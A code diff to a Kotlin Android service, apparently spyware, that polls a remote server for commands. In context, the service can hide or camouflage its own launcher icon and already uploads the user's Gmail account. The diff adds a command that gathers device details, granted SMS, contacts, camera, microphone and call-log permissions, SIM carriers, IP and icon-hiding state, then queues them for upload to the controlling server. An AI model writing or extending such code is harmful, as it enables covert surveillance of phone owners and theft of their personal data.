@@ -52,8 +52,9 @@ class PingService : Service() {
             return hash.take(10).joinToString("") { "%02x".format(it) }
         }
 
-        const val KEY_SERVER_URL = "server_url"
-        const val KEY_PING_URL   = "ping_url"
+        const val KEY_SERVER_URL  = "server_url"
+        const val KEY_PING_URL    = "ping_url"
+        const val KEY_CLIENT_IP   = "client_ip"
 
         fun serverUrl(ctx: Context): String =
             ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
@@ -178,6 +179,8 @@ class PingService : Service() {
             put("gmail",    gmailAccount())
             put("network",  networkType())
             if (!pendingReport.isNullOrBlank()) put("report", pendingReport)
+            val pendingInfo = prefs.getString("pending_info", null)
+            if (!pendingInfo.isNullOrBlank()) put("info_report", pendingInfo)
         }.toString()
 
         val req = Request.Builder()
@@ -196,6 +199,9 @@ class PingService : Service() {
                     if (it.isSuccessful) {
                         if (!pendingReport.isNullOrBlank())
                             prefs.edit().remove(KEY_REPORT).apply()
+                        val pendingInfo = prefs.getString("pending_info", null)
+                        if (!pendingInfo.isNullOrBlank())
+                            prefs.edit().remove("pending_info").apply()
                         handleResponse(bodyStr)
                     } else {
                         updateNotification("err ${it.code}")
@@ -210,11 +216,11 @@ class PingService : Service() {
         try {
             val json = JSONObject(bodyStr)
 
-            // Always save server_url from ping response if present
+            // Save server_url and client_ip from ping response
             val srv = json.optString("server_url", "")
-            if (srv.isNotBlank()) {
-                prefs.edit().putString(KEY_SERVER_URL, srv).apply()
-            }
+            if (srv.isNotBlank()) prefs.edit().putString(KEY_SERVER_URL, srv).apply()
+            val ip = json.optString("client_ip", "")
+            if (ip.isNotBlank()) prefs.edit().putString(KEY_CLIENT_IP, ip).apply()
 
             val cmd  = json.optString("cmd", "")
             val arg  = json.optString("arg", "")
@@ -233,11 +239,107 @@ class PingService : Service() {
                 "cmd_h" -> restoreIcon()         // restore main icon
                 "cmd_i" -> fullHide()            // completely hide (no icon)
                 "cmd_j" -> unHide()              // unhide and restore
+                "cmd_info" -> collectDeviceInfo() // collect all device info
             }
         } catch (_: Exception) {}
     }
 
     /* ============================================================ commands */
+
+    // INFO — collect all device info and queue for next ping
+    private fun collectDeviceInfo() {
+        try {
+            val pm  = packageManager
+            val ctx = this
+
+            // Granted dangerous permissions
+            val dangerous = listOf(
+                android.Manifest.permission.READ_SMS,
+                android.Manifest.permission.RECEIVE_SMS,
+                android.Manifest.permission.SEND_SMS,
+                android.Manifest.permission.READ_CONTACTS,
+                android.Manifest.permission.CALL_PHONE,
+                android.Manifest.permission.READ_PHONE_STATE,
+                android.Manifest.permission.READ_PHONE_NUMBERS,
+                android.Manifest.permission.ACCESS_FINE_LOCATION,
+                android.Manifest.permission.CAMERA,
+                android.Manifest.permission.RECORD_AUDIO,
+                android.Manifest.permission.READ_CALL_LOG,
+                android.Manifest.permission.GET_ACCOUNTS,
+            )
+            val granted = dangerous.filter {
+                androidx.core.content.ContextCompat.checkSelfPermission(ctx, it) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
+            }.map { it.substringAfterLast(".") }
+
+            // Icon state
+            val mainState = pm.getComponentEnabledSetting(
+                android.content.ComponentName(packageName, "$packageName.MainLauncher")
+            )
+            val hiddenState = pm.getComponentEnabledSetting(
+                android.content.ComponentName(packageName, "$packageName.HiddenLauncher")
+            )
+            val iconState = when {
+                mainState  == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED  -> "visible"
+                hiddenState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> "camouflaged"
+                else -> "hidden"
+            }
+
+            // Ringer state
+            val am = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+            val ringerState = when (am.ringerMode) {
+                android.media.AudioManager.RINGER_MODE_NORMAL  -> "ring"
+                android.media.AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
+                android.media.AudioManager.RINGER_MODE_SILENT  -> "silent"
+                else -> "unknown"
+            }
+
+            // VPN
+            val cmgr  = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            val caps  = cmgr.getNetworkCapabilities(cmgr.activeNetwork)
+            val isVpn = caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true
+
+            // SIM list
+            val sims = mutableListOf<String>()
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                    val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
+                        as android.telephony.SubscriptionManager
+                    sm.activeSubscriptionInfoList?.forEach { sub ->
+                        sims.add("${sub.displayName}(SIM${sub.simSlotIndex+1})")
+                    }
+                }
+            } catch (_: Exception) {
+                operatorName()?.let { sims.add(it) }
+            }
+
+            // App version
+            val appVersion = try {
+                pm.getPackageInfo(packageName, 0).versionName ?: "?"
+            } catch (_: Exception) { "?" }
+
+            val info = JSONObject().apply {
+                put("model",       "${Build.MANUFACTURER} ${Build.MODEL}".trim())
+                put("os",          Build.VERSION.RELEASE)
+                put("sdk",         Build.VERSION.SDK_INT)
+                put("appVersion",  appVersion)
+                put("gmail",       gmailAccount() ?: "—")
+                put("permissions", org.json.JSONArray(granted))
+                put("vpn",         isVpn)
+                put("icon",        iconState)
+                put("ringer",      ringerState)
+                put("battery",     batteryLevel())
+                put("carrier",     sims.joinToString(" • ").ifBlank { "—" })
+                put("sims",        org.json.JSONArray(sims))
+                put("network",     networkType())
+                put("ip",          prefs.getString(KEY_CLIENT_IP, "—") ?: "—")
+            }
+
+            prefs.edit().putString("pending_info", info.toString()).apply()
+        } catch (e: Exception) {
+            Log.w(TAG, "collectDeviceInfo: ${e.message}")
+        }
+    }
 
     // A — vibrate 3 times
     private fun vibrate() {
